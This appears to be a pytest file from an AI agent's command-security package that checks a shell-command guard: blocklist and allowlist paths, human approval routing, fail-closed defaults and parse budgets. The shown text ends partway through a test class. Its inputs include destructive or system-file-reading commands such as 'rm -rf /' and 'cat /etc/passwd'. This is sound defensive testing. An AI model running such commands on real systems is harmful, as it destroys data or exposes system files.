# -*- coding: utf-8 -*-
"""``command_security`` 编排层的**唯一**测试文件。

本文件是断言该编排模块行为的唯一场所：校验入口（``validate_command`` /
``enforce_command_security``）、报告与判定语义、预算与失败分类、规则全集形状与
防漂移、平台配置施加、分析失败归因，以及「声明 → 形状」下发通道。

组织顺序：判定入口 → 报告语义 → 预算与失败 → 规则全集 → 配置施加 → 失败归因 →
下发通道。

本文件刻意**不 import** ``core.tools.runtime_tools`` 的任何类型，以证明
``packages/security/`` 自足、不反向依赖 core。

helper 分工（两处 ``_settings`` / ``_verdict`` 名字看似重叠，语义**不同**，不得合并）：

- ``_cmd_settings(**overrides)`` —— 以逐字段覆盖构造配置；基线**显式**开启结构约束族
  （``enable_command_syntax_rules=True``），不依赖模型默认。
- ``_settings(**kwargs)`` —— 把 ``rule_overrides`` / ``custom_rules`` 双字段写法
  **翻译**成统一下发形态 ``rules``。
- ``_verdict(command, **overrides)`` —— 逐字段覆盖后取 verdict。
- ``_verdict_with(command, settings)`` —— 传入已构造好的 settings 对象取 verdict。
- ``_rule_ids(command, **overrides)`` —— 逐字段覆盖后取命中 rule_id 并集。
"""

from __future__ import annotations

import ast
import importlib
import json
import pathlib
import re
from dataclasses import fields, replace
from enum import Enum
from typing import get_args

import bashlex
import pytest
from aidev_agent.packages.security import command as command_pkg
from aidev_agent.packages.security.command import command_allowlist as cwl
from aidev_agent.packages.security.command import command_blocklist as cdb
from aidev_agent.packages.security.command import command_definitions as cd
from aidev_agent.packages.security.command import command_definitions as rr
from aidev_agent.packages.security.command import command_parser as cp
from aidev_agent.packages.security.command import command_parser as cp_mod
from aidev_agent.packages.security.command import command_security as cs
from aidev_agent.packages.security.command import command_security as cs_mod
from aidev_agent.packages.security.command import command_syntax_rules as csr
from aidev_agent.packages.security.command.command_allowlist import (
    ALLOWED_COMMANDS,
    ALLOWLIST_GROUPS,
)
from aidev_agent.packages.security.command.command_blocklist import (
    BLOCKLIST_CATEGORIES,
    BLOCKLIST_RULES,
)
from aidev_agent.packages.security.command.command_definitions import (
    AnalysisFailure,
    CommandSource,
    CommandVerdict,
    Pattern,
    RuleConfigError,
    RuleContext,
    RuleHit,
    RuleResult,
    RuleSet,
    RuleSpec,
    _declaration_is_literalizable,
    build_rule_set,
    data_predicate_for,
    names,
)
from aidev_agent.packages.security.command.command_parser import (
    CommandEntry,
    WalkResult,
)
from aidev_agent.packages.security.command.command_rule_validation import (
    assert_rule_invariants as _assert_rule_invariants,
)
from aidev_agent.packages.security.command.command_security import (
    RULE_SPECS,
    _blocklist_detail,
    _build_command_review,
    _spec_from_declaration,
    enforce_command_security,
    validate_command,
)
from aidev_agent.pydantic_models import RuleSpecConfig, SecurityCommandSettings, SecuritySettings
from pydantic import ValidationError
from tests.packages.security.command._walk_helpers import _walk_shared, _walk_source_text, _walk_with_budget

#: 测试基线配置：**显式**开启结构约束族与动态执行内容规则，不依赖模型默认。
#: ``enable_command_syntax_rules`` / ``enable_command_blocklist_dynamic_exec`` 的模型默认
#: 均为 ``False``（逐族默认关闭），本文件大量用例断言这些规则命中 / 拒绝，故基线必须显式
#: 声明所需开关。
_OK = SecurityCommandSettings(enable_command_syntax_rules=True, enable_command_blocklist_dynamic_exec=True)


def _cmd_settings(**overrides) -> SecurityCommandSettings:
    """把逐字段覆盖值收成单一 settings 对象（``validate_command`` 的唯一配置入口）。

    基线**显式**开启结构约束族（``enable_command_syntax_rules=True``）与动态执行内容规则
    （``enable_command_blocklist_dynamic_exec=True``），不依赖模型默认——本文件的规则断言
    绝大多数要求这些规则命中 / 拒绝。调用方显式传入的同名覆盖优先。
    始终构造实例，绝不返回 ``None``：``validate_command`` 的该参数必填，省略即
    ``TypeError``（缺失配置属 fail-open）。
    """
    overrides.setdefault("enable_command_syntax_rules", True)
    overrides.setdefault("enable_command_blocklist_dynamic_exec", True)
    return SecurityCommandSettings(**overrides)


def _settings(**kwargs) -> SecurityCommandSettings:
    """把简写翻译为统一下发形态 ``rules``（**唯一**被读取的字段）。

    - ``rule_overrides={id: {...}}`` → 一条 ``enabled=True`` 的**完整声明**（替换内置 / 新增）：
      ``verdict`` 直接作为下发字段；缺少时回填内置 verdict（使「只改判定」的用例不必重复声明）。
      ``tokens`` 缺省时会回填内置 pattern 的内容（替换语义是 **REPLACE**，空 tokens 会被
      闸门 4 拒收——这与旧模型「空 = 只调开关」的双重含义不同）。
    - ``custom_rules=[...]`` → 追加一条声明（新增规则，**无前缀要求**）。
    - ``disabled=[id, ...]`` → 追加 ``enabled=False`` 的声明（按 id 关闭；只需 rule_id）。

    **三种操作现在是正交的单一含义**：声明完整规则 / 新增规则 / 按 id 关闭。

    基线**显式**开启结构约束族（``enable_command_syntax_rules=True``），不依赖模型默认；
    调用方显式传入的同名覆盖优先。
    """
    overrides = kwargs.pop("rule_overrides", None) or {}
    customs = kwargs.pop("custom_rules", None) or []
    disabled = kwargs.pop("disabled", None) or []
    declarations: list[dict] = []
    for rule_id, ov in overrides.items():
        declaration: dict = {
            "rule_id": rule_id,
            "verdict": ov["verdict"] if ov.get("verdict") else _builtin_verdict(rule_id),
            "justification": ov.get("justification") or f"平台调整 {rule_id}",
        }
        # 内容覆盖：未给 tokens 时沿用内置 pattern 的 token（REPLACE 语义下必须非空）。
        if "tokens" in ov:
            declaration["tokens"] = ov["tokens"]
        else:
            declaration["tokens"] = _builtin_tokens(rule_id)
        declarations.append(declaration)
    for c in customs:
        declarations.append(
            {
                "rule_id": c["rule_id"],
                "verdict": c["verdict"],
                "justification": c["reason"],
                "tokens": list(c["match"]["command_names"]),
            }
        )
    for rule_id in disabled:
        declarations.append({"rule_id": rule_id, "enabled": False})
    if declarations:
        kwargs["rules"] = [*kwargs.get("rules", []), *declarations]
    kwargs.setdefault("enable_command_syntax_rules", True)
    return SecurityCommandSettings(**kwargs)


def _builtin_verdict(rule_id: str) -> str:
    """取内置规则的 ``verdict``（供「只改判定 / 只关开关」的用例回填必填字段）。"""
    return RULE_SPECS[rule_id].verdict


def _builtin_tokens(rule_id: str) -> list:
    """取内置规则 pattern 的 token（供「只改判定」的用例构造可字面化的替换声明）。"""
    pattern = RULE_SPECS[rule_id].pattern
    assert pattern is not None, f"{rule_id} 无 pattern，不能用 _settings 的简化写法替换内容"
    return [list(tok) if isinstance(tok, tuple) else tok for tok in pattern.tokens]


def _custom(rule_id: str, command_names: list[str], verdict: str = "block") -> dict:
    return {
        "rule_id": rule_id,
        "verdict": verdict,
        "reason": f"自定义规则 {rule_id}",
        "match": {"command_names": command_names},
    }


def _run(command: str, settings: SecurityCommandSettings | None = None):
    return validate_command(command, security_command_settings=settings or _OK)


def _verdict(command: str, **overrides) -> str:
    """逐字段覆盖后取 verdict（``overrides`` 直接进 settings 构造器）。"""
    return validate_command(command, security_command_settings=_cmd_settings(**overrides)).verdict


def _verdict_with(command: str, settings: SecurityCommandSettings | None = None) -> str:
    """传入**已构造好的** settings 对象取 verdict。"""
    return _run(command, settings).verdict


def _report_rule_ids(report) -> set[str]:
    """取报告的命中 rule_id 并集（命令明细 ∪ 结构明细）。"""
    return {rule.rule_id for finding in report.findings for rule in finding.rules} | {
        item.rule_id for item in report.structure_findings
    }


def _rule_ids(command: str, **overrides) -> set[str]:
    settings = _cmd_settings(**overrides) if overrides else _OK
    return _report_rule_ids(_run(command, settings))


def _names_of(pattern) -> frozenset[str]:
    """取 ``Pattern`` 里的静态命令名集合（``names(...)`` 形状：``tokens[0]`` 的 alternatives）。

    ``pattern`` 为 ``None`` 时返回空集（「不可字面化」）。
    """
    if pattern is None or not pattern.tokens:
        return frozenset()
    first = pattern.tokens[0]
    return frozenset(first) if isinstance(first, tuple) else frozenset({first})


class TestEnforcePathways:
    @pytest.mark.parametrize(
        "settings_kwargs, command, match",
        [
            # 黑名单关 + 允许列表命令：放行
            ({"enable_command_blocklist": False}, "ls /tmp", None),
            ({"enable_command_blocklist": False}, "echo hi", None),
            # 黑名单关：灰名单命令回落允许列表 review 路径（显式 block 处置档，见下）
            (
                {"enable_command_blocklist": False, "command_review_disposition": "block"},
                "rm -rf /phase10-fixture",
                "未命中任何规则",
            ),
            # 黑名单开启：命中危险命令
            ({"enable_command_blocklist": True}, "rm -rf /phase10-fixture", "命令黑名单"),
            # 黑名单关：python 包管理等价入口放行（Python 已在允许列表）
            ({"enable_command_blocklist": False}, "python3 -m pip install requests", None),
            # 黑名单开启：python 包管理等价入口硬拒
            ({"enable_command_blocklist": True}, "python3 -m pip install requests", "命令黑名单"),
            # review 处置档显式钉死为 block：灰名单命令被拒
            ({"command_review_disposition": "block"}, "touch /tmp/x", "未命中任何规则"),
            # ``cat /etc/passwd`` 是旧误报：AST 后两态均放行
            ({"enable_command_blocklist": True}, "cat /etc/passwd", None),
            ({"enable_command_blocklist": False}, "cat /etc/passwd", None),
        ],
    )
    def test_layer_paths(self, settings_kwargs, command, match):
        """黑名单 / 允许列表 / 审批三层主路径（None 表示放行不抛）。"""
        ss = SecurityCommandSettings(**settings_kwargs)
        if match is None:
            enforce_command_security(command, "local", ss)
        else:
            with pytest.raises(ValueError, match=match):
                enforce_command_security(command, "local", ss)

    def test_blacklist_rejection_excludes_allowlist_wording(self):
        """黑名单关闭时灰名单命令的拒绝理由不含「黑名单」字样（显式 block 处置档）。"""
        ss = SecurityCommandSettings(enable_command_blocklist=False, command_review_disposition="block")
        with pytest.raises(ValueError) as exc:
            enforce_command_security("rm -rf /phase10-fixture", "local", ss)
        assert "黑名单" not in str(exc.value)

    def test_dynamic_block_never_reaches_assessor_or_approval(self, monkeypatch):
        """动态执行内容默认 block：assessor 与审批都不得被调用。"""
        calls: list[str] = []
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: calls.append("approval") or True)
        ss = SecurityCommandSettings(
            enable_command_blocklist_dynamic_exec=True,
            enable_command_review_auto=True,
            command_review_disposition="approval",
            command_approval_approvers="u1",
        )
        # dynamic 默认 block：预分流与审批都不得被调用
        assessor = type("R", (), {"assess": lambda self, c: calls.append("assess") or "allow"})()
        with pytest.raises(ValueError, match="命令执行被拒绝"):
            enforce_command_security("$CMD arg", "local", ss, assessor)
        assert calls == []


class TestFullAggregationOrderIndependence:
    """全量收集后取最严；顺序不得改变结论（旧「首个失败即返回」的缺陷回归）。"""

    BLACKLIST_OFF_APPROVAL_ON = dict(
        enable_command_blocklist=False, command_review_disposition="approval", command_approval_approvers="u1"
    )

    @pytest.mark.parametrize("command", ["mycmd && uname -a", "uname -a && mycmd"])
    def test_hard_restriction_blocks_in_both_orders(self, monkeypatch, command):
        """前有灰名单也不能绕过后面的硬参数限制；审批调用必须为 0。

        黑名单开关**开启**（默认）：``args:restricted`` 属黑名单族（category
        ``system_state``），故硬限制生效、且两序结论一致。
        """
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: True)
        ss = SecurityCommandSettings(enable_command_blocklist=True, command_review_disposition="approval")
        # 参数限制走黑名单拒绝路径（category=system_state 属黑名单族），
        # 故文案是「命令黑名单」而非「不在允许列表中」。
        with pytest.raises(ValueError, match="命令黑名单|不允许使用参数"):
            enforce_command_security(command, "local", ss)

    @pytest.mark.parametrize("command", ["mycmd && uname -a", "uname -a && mycmd"])
    def test_hard_restriction_disabled_with_blacklist_switch(self, monkeypatch, command):
        """``enable_command_blocklist=False`` 会一并放开关闭参数限制。

        ``args:restricted`` 的 category 是 ``system_state``（属黑名单族），
        故它**受该开关管辖**——关掉黑名单意味着这些规则整族不贡献，
        ``uname -a`` 随之落到 ``review`` 兜底（转审批），不再硬拒。

        这是刻意的取舍：blacklist 开关的语义是「本部署不要危险命令名录」，
        参数限制既已归入该名录，就应一同受控。若需独立控制，应另加开关。
        """
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: True)
        ss = SecurityCommandSettings(**self.BLACKLIST_OFF_APPROVAL_ON)
        # 不再抛错：硬限制随黑名单开关关闭，commands 落 review 并走审批。
        enforce_command_security(command, "local", ss)

    def test_all_grey_list_still_reaches_one_approval(self, monkeypatch):
        """阳性对照：全灰名单仍走一次审批（防把「灰名单也不得审批」误实现）。"""
        captured: list[tuple] = []

        def _spy(command, **kwargs):
            captured.append((command, kwargs))
            return True

        monkeypatch.setattr(cs, "require_command_approval", _spy)
        ss = SecurityCommandSettings(**self.BLACKLIST_OFF_APPROVAL_ON)
        enforce_command_security("mycmd && mycmd2", "local", ss)
        assert len(captured) == 1
        assert captured[0][0] == "mycmd && mycmd2"


class TestApprovalBranch:
    """Layer 2 审批分支（patch 本模块内的 require_command_approval 名字）。"""

    @staticmethod
    def _approval_settings(**kwargs) -> SecurityCommandSettings:
        merged = dict(command_review_disposition="approval", command_approval_approvers="u1")
        merged.update(kwargs)
        return SecurityCommandSettings(**merged)

    @pytest.mark.parametrize("approved, should_raise", [(False, True), (True, False)])
    def test_manual_approval_outcome(self, monkeypatch, approved, should_raise):
        """审批拒绝 -> 抛「命令审批未通过」；通过 -> 放行。"""
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: approved)
        if should_raise:
            with pytest.raises(ValueError, match="命令审批未通过"):
                enforce_command_security("touch /tmp/x", "local", self._approval_settings())
        else:
            enforce_command_security("touch /tmp/x", "local", self._approval_settings())

    def test_whole_command_approved_once_with_review_payload(self, monkeypatch):
        """整条原始命令一次审批，并附 JSON-safe 的 review 明细。"""
        captured: list[dict] = []

        def _spy(command, **kwargs):
            captured.append({"command": command, **kwargs})
            return True

        monkeypatch.setattr(cs, "require_command_approval", _spy)
        raw = "  mycmd   --ver  "
        enforce_command_security(raw, "sbx", self._approval_settings())
        assert len(captured) == 1
        assert captured[0]["command"] == raw  # 原始串（含空白）不变
        review = captured[0]["command_review"]
        json.dumps(review)  # 必须是普通 JSON（无 default 兜底）
        assert review["sources"][0]["source_id"] == 0
        assert review["findings"][0]["source_id"] == 0
        # **零规则命中**：``mycmd`` 不在允许列表也不在黑名单，故 review
        # 由控制流产出，``rules == []`` —— 这正是「未命中任何规则」的信号。
        # 审批人另有 ``command``（原串）佐证。
        assert review["findings"][0]["verdict"] == "review"
        assert review["findings"][0]["rules"] == []

    def test_smart_allow_passes_smart_block_rejected(self):
        """预分流三态：allow 放行、block 拒绝（复用 report 明细文案）、approval 落处置档。"""
        ss = self._approval_settings(enable_command_review_auto=True)
        enforce_command_security("touch /tmp/x", "local", ss, type("R", (), {"assess": lambda self, c: "allow"})())
        # block 文案复用 report 明细（含「未命中任何规则」），不再丢理由
        with pytest.raises(ValueError, match="命令执行被拒绝：.*未命中任何规则"):
            enforce_command_security("touch /tmp/x", "local", ss, type("R", (), {"assess": lambda self, c: "block"})())

    def test_smart_approval_falls_through_to_disposition(self, monkeypatch):
        captured: list[str] = []
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: captured.append("hit") or True)
        ss = self._approval_settings(enable_command_review_auto=True)
        enforce_command_security("touch /tmp/x", "local", ss, type("R", (), {"assess": lambda self, c: "approval"})())
        assert captured == ["hit"]

    def test_review_auto_skipped_without_assessor(self, monkeypatch):
        """开关开启但未注入评估器：跳过预分流，直接走处置档（approval）。"""
        captured: list[str] = []
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: captured.append("hit") or True)
        ss = self._approval_settings(enable_command_review_auto=True)
        enforce_command_security("touch /tmp/x", "local", ss, None)
        assert captured == ["hit"]

    def test_review_auto_off_assessor_not_called(self, monkeypatch):
        """开关关闭：即便注入了评估器也不得调用，直接走处置档。"""
        calls: list[str] = []

        def _spy(*a, **kw):
            calls.append("hit")
            return True

        monkeypatch.setattr(cs, "require_command_approval", _spy)
        ss = self._approval_settings(enable_command_review_auto=False)
        assessor = type("R", (), {"assess": lambda self, c: calls.append("assess") or "allow"})()
        enforce_command_security("touch /tmp/x", "local", ss, assessor)
        assert calls == ["hit"]

    @pytest.mark.parametrize("disposition", ["allow", "block"])
    def test_review_auto_not_run_outside_approval(self, monkeypatch, disposition):
        """预分流只为减少人工审批量：处置档非 approval 时不得调用评估器。

        allow 档直接放行、block 档直接拒绝，均与评估器结论无关；跑评估器是纯开销，
        且会覆盖部署的显式选择。
        """
        calls: list[str] = []
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: calls.append("approval") or True)
        ss = SecurityCommandSettings(
            command_review_disposition=disposition,
            command_approval_approvers="u1",
            enable_command_review_auto=True,
        )
        assessor = type("R", (), {"assess": lambda self, c: calls.append("assess") or "allow"})()
        if disposition == "allow":
            enforce_command_security("touch /tmp/x", "local", ss, assessor)
        else:
            with pytest.raises(ValueError, match="命令执行被拒绝"):
                enforce_command_security("touch /tmp/x", "local", ss, assessor)
        assert calls == [], f"disposition={disposition!r} 不应调用评估器或审批"

    def test_uncertain_with_no_approvers_is_rejected(self):
        """审批不可用（无审批人）不得退化为直接允许 —— fail-closed 拒绝。"""
        ss = SecurityCommandSettings(command_review_disposition="approval", command_approval_approvers="")
        with pytest.raises(ValueError, match="命令审批未通过"):
            enforce_command_security("touch /tmp/x", "local", ss)

    def test_approval_interrupt_exception_is_rejected(self, monkeypatch):
        """审批普通异常同样 fail-closed（但保留 GraphInterrupt 正常传播）。"""

        def _boom(*args, **kwargs):
            raise RuntimeError("no graph context")

        monkeypatch.setattr(cs, "require_command_approval", _boom)
        with pytest.raises(RuntimeError):
            enforce_command_security("touch /tmp/x", "local", self._approval_settings())

    def test_review_disposition_block_rejects(self):
        """处置档 block：review 命令（未命中任何规则）被直接拒绝。

        模型默认是 ``allow``（尽量不影响业务），此处**显式**钉死 block 以隔离该处置档本身。
        """
        ss = SecurityCommandSettings(command_review_disposition="block")
        with pytest.raises(ValueError):
            enforce_command_security("touch /tmp/x", "local", ss)

    def test_review_disposition_allow_passes(self):
        """处置档 allow：review 命令直接放行，不调用审批。"""
        ss = SecurityCommandSettings(command_review_disposition="allow")
        enforce_command_security("touch /tmp/x", "local", ss)

    def test_review_disposition_block_never_approves(self, monkeypatch):
        """处置档 block：即便审批可调用也不得被调用（防误落审批）。"""
        calls: list[str] = []
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: calls.append("hit") or True)
        ss = SecurityCommandSettings(command_review_disposition="block", command_approval_approvers="u1")
        with pytest.raises(ValueError, match="命令执行被拒绝"):
            enforce_command_security("touch /tmp/x", "local", ss)
        assert calls == []


class TestValidateHasNoApprovalSideEffect:
    """``validate_command`` 不触发审批——合并组 #1 的唯一归属地。

    原 ``test_command_ast.py::TestCommandReport::test_validate_command_has_no_approval_side_effect``
    与本类同名用例断言同一契约；本类版本更强（3 条命令，覆盖 allow / block / review
    三条分支），故合并到此处，另一处节点已登记删除。
    """

    def test_direct_validate_never_calls_approval(self, monkeypatch):
        calls: list[tuple] = []
        monkeypatch.setattr(cs, "require_command_approval", lambda *a, **kw: calls.append(a) or True)
        for command in ("touch /tmp/x", "rm -rf /", "ls /tmp"):
            validate_command(command, security_command_settings=SecurityCommandSettings())
        assert calls == []


class TestSecuritySettingsIsRequired:
    """``security_settings`` 位置必填，缺参即 ``TypeError``。"""

    def test_missing_third_argument_raises_type_error(self):
        with pytest.raises(TypeError):
            enforce_command_security("rm -rf /", "local")

    def test_explicit_none_is_no_longer_accepted(self):
        """显式传 ``None`` 同样不再合法：函数体第一件事会抛 ``AttributeError``。"""
        with pytest.raises(AttributeError):
            enforce_command_security("rm -rf /", "local", None)


# ========== 预算与失败分类 ==========


class TestWalkBudgetExact:
    """节点/深度计费与共享预算的精确边界（等于上限允许，超过才拒绝）。"""

    def test_nodes_boundary(self):
        """``echo a`` 恰 3 个规范节点：max_nodes=3 通过，=2 超限。"""
        assert _walk_with_budget("echo a", max_nodes=3).used_nodes == 3
        with pytest.raises(Exception) as exc:
            _walk_with_budget("echo a", max_nodes=2)
        assert "budget:max_nodes" in str(exc.value)

    def test_shared_budget_across_two_walks(self):
        """同一 budget 被两次遍历共享：第一次耗 3 通过，累计到 4 仍通过，第 5 个超限。"""
        assert _walk_shared(["echo a"], max_nodes=4).used_nodes == 3
        # 两个遍历共用 4 的预算：第一个耗 3，第二个在第 2 个节点处累计到 5 → 超限。
        with pytest.raises(Exception) as exc:
            _walk_shared(["echo a", "echo b"], max_nodes=4)
        assert "budget:max_nodes" in str(exc.value)

    def test_depth_boundary(self):
        """``echo a`` 根为 1、word 为 2：max_depth=2 通过，=1 超限。"""
        assert _walk_with_budget("echo a", max_depth=2).used_nodes == 3
        with pytest.raises(Exception) as exc:
            _walk_with_budget("echo a", max_depth=1)
        assert "budget:max_depth" in str(exc.value)

    def test_synthetic_tree_uses_same_algorithm(self):
        """合成有界树按同一算法计费，不依赖 parser 的递归崩溃阈值。"""
        budget = cp.WalkBudget(max_command_length=1024, max_nodes=3, max_depth=64, max_reparse_depth=4)
        for _ in range(3):
            budget.charge_node(1)
        assert budget.used_nodes == 3
        with pytest.raises(Exception) as exc:
            budget.charge_node(1)
        assert "budget:max_nodes" in str(exc.value)


class TestValidatorBudget:
    """经真实来源队列的预算边界（root 与全部子脚本共用同一预算）。"""

    @staticmethod
    def _v(command: str, **overrides) -> str:
        return validate_command(command, security_command_settings=SecurityCommandSettings(**overrides)).verdict

    def test_nodes_include_root(self):
        """root list(1) + 两个 command(4) + operator(1) = 10，两个 child 各 3，总 16。"""
        assert self._v("bash -c 'echo a'; bash -c 'echo b'", max_nodes=16) == "allow"
        assert self._v("bash -c 'echo a'; bash -c 'echo b'", max_nodes=15) == "block"
        assert self._v("bash -c 'echo a'; bash -c 'echo b'", max_nodes=13) == "block"

    def test_cumulative_length_counts_every_source(self):
        """长度预算累计 root 原文 + 每个脚本文本（等于上限允许）。"""
        total = len("bash -c 'echo a'") + len("echo a")
        assert self._v("bash -c 'echo a'", max_command_length=total) == "allow"
        assert self._v("bash -c 'echo a'", max_command_length=total - 1) == "block"

    def test_raw_text_is_charged_without_strip(self):
        """原文不做 strip：``'  echo a  '`` 计的 10 字符含两侧空白。"""
        assert self._v("  echo a  ", max_command_length=10) == "allow"
        assert self._v("  echo a  ", max_command_length=9) == "block"

    def test_reparse_depth_boundary(self):
        """每层脚本文本 +1：root=0、child=1、grandchild=2。"""
        nested = "bash -c 'bash -c \"ls\"'"
        assert self._v(nested, max_reparse_depth=2) == "allow"
        assert self._v(nested, max_reparse_depth=1) == "block"

    def test_same_depth_siblings_do_not_accumulate(self):
        """两个同深度兄弟脚本在 max_reparse_depth=1 下仍通过（深度不是累加计数）。"""
        assert self._v("bash -c 'echo a'; bash -c 'echo b'", max_reparse_depth=1) == "allow"

    def test_defaults_allow_typical_input(self):
        """默认预算下 5005 字符长命令仍放行（默认值与既有回归一致）。"""
        assert (
            validate_command("echo " + "A" * 5000, security_command_settings=SecurityCommandSettings()).verdict
            == "allow"
        )


class TestParameterGuardScaling:
    """同一 word 内大量 parameter 不得触发二次方开销。

    旧实现按每个 parameter 重新扫描跨度（``_scan_span`` 内 ``boundaries=None``
    ⇒ 每次重算 ``_delimiter_boundaries``），``echo ${x}${x}...`` 在 N=500/1000/1500
    时实测 1.5s / 5.9s / 13.6s。修复后 ``_delimiter_boundaries`` 每个 source 只算一次。

    判据用**调用计数**而非墙钟：本仓约定「护栏不用时序断言」——墙钟在 CI/负载下会
    假红。计数判据直接钉住该回退的**机制**（每个 parameter 是否重复建分隔符索引），
    不受调度噪声影响。
    """

    @staticmethod
    def _many_parameters(n: int) -> str:
        command = "echo " + "${x}" * n
        assert len(command) <= 8192  # 必须落在默认长度预算内，否则测的是预算而非复杂度
        return command

    @staticmethod
    def _count_boundaries_builds(command: str) -> int:
        """跑一次 ``validate_command``，返回 ``_delimiter_boundaries`` 的调用次数。"""

        original = csr._delimiter_boundaries  # noqa: SLF001
        calls = [0]

        def counting(text):  # noqa: ANN001, ANN202
            calls[0] += 1
            return original(text)

        csr._delimiter_boundaries = counting  # type: ignore[assignment]
        try:
            validate_command(command, security_command_settings=SecurityCommandSettings())
        finally:
            csr._delimiter_boundaries = original  # type: ignore[assignment]
        return calls[0]

    @pytest.mark.parametrize("n", [500, 1000, 1500])
    def test_many_parameters_stay_fast_and_allow(self, n):
        """落在长度预算内 → 仍为 allow（预期值；耗时不再作为判据）。"""
        command = self._many_parameters(n)
        report = validate_command(command, security_command_settings=SecurityCommandSettings())
        assert report.verdict == "allow"

    @pytest.mark.parametrize("n", [10, 500, 1500])
    def test_boundaries_built_once_regardless_of_parameter_count(self, n):
        """分隔符索引的构建次数**与 parameter 数脱钩**（回退的机制判据）。

        正确实现下恒为常数（不随 N 增长）；按 parameter 重复建索引的旧实现会随 N
        线性增长（实测 22 / 1002 / 3002，即 ``2N+2``），故本条可证伪。
        """
        count = self._count_boundaries_builds(self._many_parameters(n))
        assert count <= 2, (
            f"N={n} 时 _delimiter_boundaries 被调用 {count} 次——疑似每个 parameter 重复构建分隔符索引（二次方回退）"
        )

    def test_boundary_build_count_does_not_grow_with_n(self):
        """N 增 3 倍时构建次数不得随之增长（与上一条互补：直接比较两个规模）。"""
        small = self._count_boundaries_builds(self._many_parameters(500))
        large = self._count_boundaries_builds(self._many_parameters(1500))
        assert large <= small, f"500->1500 时构建次数 {small}->{large}，与 parameter 数呈正相关"


class TestDirectConfigValidation:
    """``validate_command`` 的配置只经单一 ``SecurityCommandSettings`` 对象传入。

    逐字段 kwarg 与 ``None`` 表示「未覆盖」的旧入口已删除（双真源整改）；
    非法值一律在构造 settings 时即被模型校验拒绝。
    """

    @pytest.mark.parametrize(
        "field, bad",
        [
            ("max_command_length", 0),
            ("max_command_length", -1),
            ("max_command_length", True),
            ("max_command_length", 1.0),
            ("max_command_length", "1"),
            ("max_command_length", 65537),
            ("max_nodes", 1.0),
            ("max_nodes", "1"),
            ("max_nodes", 1000001),
            ("max_depth", 1.0),
            ("max_depth", 4097),
            ("max_reparse_depth", 1.0),
            ("max_reparse_depth", 65),
        ],
    )
    def test_illegal_value_raises_at_settings_construction(self, field, bad):
        """非法值在构造 settings 时报 ``ValidationError``（validate_command 不再重复校验）。"""

        with pytest.raises(ValidationError):
            SecurityCommandSettings(**{field: bad})

    @pytest.mark.parametrize("field", ["max_command_length", "max_nodes", "max_depth", "max_reparse_depth"])
    def test_boundary_zero_rejected_via_settings(self, field):
        """下界为 1：显式 0 在 settings 构造期被拒绝。"""

        with pytest.raises(ValidationError):
            SecurityCommandSettings(**{field: 0})

    def test_settings_object_is_the_single_config_entry(self):
        """单一配置对象入口：显式传入 ``SecurityCommandSettings()`` 走模型默认值。"""
        assert validate_command("ls", security_command_settings=SecurityCommandSettings()).verdict == "allow"

        with pytest.raises(ValidationError):
            SecurityCommandSettings(max_nodes=None)

    def test_platform_explicit_allow_is_rejected(self):
        """平台不提供 ``allow`` 档：``dynamic_execution_policy="allow"`` 被拒。

        与 ``test_dynamic_policy_has_no_allow_level``（已合并至此）同型；
        本处保留为显式契约：平台配置不存在「显式放行动态执行」这一档。
        """

        with pytest.raises(ValidationError):
            SecurityCommandSettings(dynamic_execution_policy="allow")


class TestSourceFailures:
    """全来源、全阶段的异常分类（一个 child 失败不遮盖其他已排队来源）。"""

    @pytest.mark.parametrize(
        "command, rule_id",
        [
            ('echo "unclosed', "parse:syntax_error"),
            ("[[ -f x ]]", "parse:syntax_error"),
            ("for ((i=0;i<3;i++)); do echo x; done", "parse:syntax_error"),
            ("case x in a) echo 1;; esac", "parse:unsupported_syntax"),
            ("coproc echo hi", "parse:unsupported_syntax"),
            ("time ls", "parse:unsupported_syntax"),
            ("", "empty:no_executable_command"),
            ("   ", "empty:no_executable_command"),
            ("# only a comment", "empty:no_executable_command"),
            ("echo hello\x00world", "input:null_byte"),
        ],
    )
    def test_failure_classes(self, command, rule_id):
        report = validate_command(command, security_command_settings=SecurityCommandSettings())
        assert report.verdict == "block"
        assert rule_id in {item.rule_id for item in report.structure_findings}

    def test_comment_prefix_then_command_is_allowed(self):
        assert validate_command("# c\necho ok", security_command_settings=SecurityCommandSettings()).verdict == "allow"

    @pytest.mark.parametrize(
        "command, expected",
        [
            ('bash -c "echo a"; bash -c "echo b"', "allow"),
            ("bash -c 'echo a'; bash -c 'echo \"b'", "block"),
            ("echo a; echo b", "allow"),
            ("bash -c 'echo a'; bash -c 'coproc x'", "block"),
        ],
    )
    def test_sibling_sources_are_independent(self, command, expected):
        report = validate_command(command, security_command_settings=SecurityCommandSettings())
        assert report.verdict == expected

    @pytest.mark.parametrize("policy", ["block", "review"])
    def test_budget_failure_is_never_review(self, policy):
        """预算/递归超限是独立 block，不能因动态 review 配置降级为审批。"""
        settings = SecurityCommandSettings(max_nodes=1, dynamic_execution_policy=policy)
        report = validate_command("ls", security_command_settings=settings)
        assert report.verdict == "block"
        assert "analysis:incomplete" in {item.rule_id for item in report.structure_findings}

    def test_all_fatal_findings_are_preserved(self):
        """两个静态子脚本分别失败时逐条保留，不用单槽覆盖。"""
        report = validate_command(
            "bash -c 'echo \"a'; bash -c 'echo \"b'", security_command_settings=SecurityCommandSettings()
        )
        assert report.verdict == "block"
        assert len([item for item in report.structure_findings if item.rule_id == "parse:syntax_error"]) == 2


# ========== 分析失败归因 ==========


#: 13 条分析失败标识的值（顺序与枚举定义一致）。
_EXPECTED_VALUES = (
    "parse:syntax_error",
    "parse:unsupported_syntax",
    "parse:internal_error",
    "input:null_byte",
    "empty:no_executable_command",
    "analysis:incomplete",
    "rule:internal_error",
    "budget:max_command_length",
    "budget:max_nodes",
    "budget:max_depth",
    "budget:max_reparse_depth",
    "budget:recursion",
    "ast:unknown_node",
)

#: 分析失败标识（**不在** RULE_SPECS 内）。
ANALYSIS_FAILURE_IDS: frozenset[str] = frozenset(member.value for member in AnalysisFailure)


class TestAnalysisFailureIdentity:
    """``AnalysisFailure`` 是 13 个归因标识的**唯一真源**。"""

    def test_values_match_the_thirteen_rule_ids(self):
